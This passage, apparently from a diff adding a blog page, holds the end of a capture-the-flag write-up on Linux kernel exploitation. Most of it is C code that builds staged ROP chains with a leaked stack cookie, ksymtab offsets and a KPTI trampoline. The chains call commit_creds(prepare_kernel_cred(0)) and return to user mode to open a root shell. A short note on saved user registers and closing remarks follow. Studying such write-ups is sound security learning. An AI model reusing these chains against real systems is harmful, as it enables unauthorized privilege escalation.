+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kpti_trampoline; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> prepare_kernel_creds_asm_save; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(global_fd,payload,<span style="color:#66d9ef">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">prepare_kernel_creds_asm_save</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__asm__</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov tmp,rax;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prepare_kernel_cred <span style="color:#f92672">=</span> ksymtab_prepare_kernel_cred <span style="color:#f92672">+</span> tmp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">step2</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">commit_creds_asm_save</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__asm__</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov tmp,rax;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prepare_commit_creds <span style="color:#f92672">=</span> ksymtab_commit_creds <span style="color:#f92672">+</span> tmp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stage3</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">step2</span>(){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> payload[<span style="color:#ae81ff">50</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> offs<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 16 is the cookie offset
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs] <span style="color:#f92672">=</span> cookie;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbx 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// r12 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> pop_rax_ret; <span style="color:#75715e">// function ret 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> ksymtab_commit_creds<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> read_mem_pop1_ret; <span style="color:#75715e">// 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kpti_trampoline; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> commit_creds_asm_save; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(global_fd,payload,<span style="color:#66d9ef">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">after_prepare_kernel_cred</span>(){
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__asm__</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov tmp , rax;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    struct_commit_creds <span style="color:#f92672">=</span> tmp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stage4</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">stage3</span>(){
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">unsigned</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> payload[n];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> off <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> cookie;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// r12
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> pop_rdi_rbp_ret; <span style="color:#75715e">// return address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// rdi &lt;- 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> prepare_kernel_cred; <span style="color:#75715e">// prepare_kernel_cred(0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kpti_trampoline; <span style="color:#75715e">//  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)after_prepare_kernel_cred;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(global_fd, payload, <span style="color:#66d9ef">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">stage4</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> payload[n];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> off <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> cookie;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// r12
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> pop_rdi_rbp_ret; <span style="color:#75715e">// return address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> struct_commit_creds; <span style="color:#75715e">// 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// dummy rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> commit_creds; <span style="color:#75715e">// commit_creds(returned_creds_struct)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kpti_trampoline; <span style="color:#75715e">// swapgs_restore_regs_and_return_to_usermode + 22
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// dummy rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// dummy rdi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)popShell;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(global_fd, payload, <span style="color:#66d9ef">sizeof</span>(payload))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>NOTE: Another important thing to remember is we need to provide the CS , rflags ,sp and ss register which are popped from the stack during a kernel -&gt; userland swap</strong></p>
+<h2 id="closing-thoguhts">Closing Thoguhts<a href="#closing-thoguhts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This Challenge seemed like a good introduction to kernel pwning and how to navigate kernel source sadly i couldn’t elaborate on everything i learned while solving this challemnge in this blog post so i definately recommend googling around …. <a href="https://twitter.com/0xAtharv">0xAtharv</a> Out !</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
